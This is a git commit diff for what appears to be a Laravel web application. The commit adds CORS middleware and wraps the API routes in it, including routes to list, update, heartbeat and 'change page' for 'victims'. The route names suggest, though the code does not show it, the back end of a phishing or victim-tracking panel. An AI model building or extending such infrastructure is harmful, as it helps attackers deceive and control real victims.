8fa790380fae8ea665ba167a5386c86ee17b3114
Ilham Mulia <dev.ilhammulia@gmail.com>
2024-02-05 12:25:03 +0700

    fix(cors): add cors to api

--- app/Http/Kernel.php
+++ app/Http/Kernel.php
@@ -67,5 +67,6 @@ class Kernel extends HttpKernel
         'throttle' => \Illuminate\Routing\Middleware\ThrottleRequests::class,
         'verified' => \Illuminate\Auth\Middleware\EnsureEmailIsVerified::class,
         'must.admin' => \App\Http\Middleware\MustAdmin::class,
+        'cors' => \App\Http\Middleware\Cors::class,
     ];
 }
--- routes/api.php
+++ routes/api.php
@@ -17,20 +17,22 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
-Route::prefix('auth')->group(function () {
-    Route::post('login', [AuthController::class, 'login'])->name('api.auth.login');
-    Route::put('users/{id}', [AuthController::class, 'update'])->name('api.auth.update');
-});
-
 Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
     return $request->user();
 });
 
-Route::get('/server/stats', [UserPanelController::class, 'stats'])->name('api.server.stats');
-Route::get('/server/data', [UserPanelController::class, 'data'])->name('api.server.data');
-Route::post('/server', [UserPanelController::class, 'update'])->name('api.server.update');
+Route::middleware(['cors'])->group(function () {
+    Route::prefix('auth')->group(function () {
+        Route::post('login', [AuthController::class, 'login'])->name('api.auth.login');
+        Route::put('users/{id}', [AuthController::class, 'update'])->name('api.auth.update');
+    });
 
-Route::post('/victims', [VictimController::class, 'update'])->name('api.victims.update');
-Route::post('/victims/pages', [VictimController::class, 'changePage'])->name('api.victims.page');
-Route::get('/victims', [VictimController::class, 'get'])->name('api.victims.get');
-Route::get('/victims/heartbeat', [VictimController::class, 'heartbeat'])->name('api.victims.heartbeat');
+    Route::get('/server/stats', [UserPanelController::class, 'stats'])->name('api.server.stats');
+    Route::get('/server/data', [UserPanelController::class, 'data'])->name('api.server.data');
+    Route::post('/server', [UserPanelController::class, 'update'])->name('api.server.update');
+
+    Route::post('/victims', [VictimController::class, 'update'])->name('api.victims.update');
+    Route::post('/victims/pages', [VictimController::class, 'changePage'])->name('api.victims.page');
+    Route::get('/victims', [VictimController::class, 'get'])->name('api.victims.get');
+    Route::get('/victims/heartbeat', [VictimController::class, 'heartbeat'])->name('api.victims.heartbeat');
+});
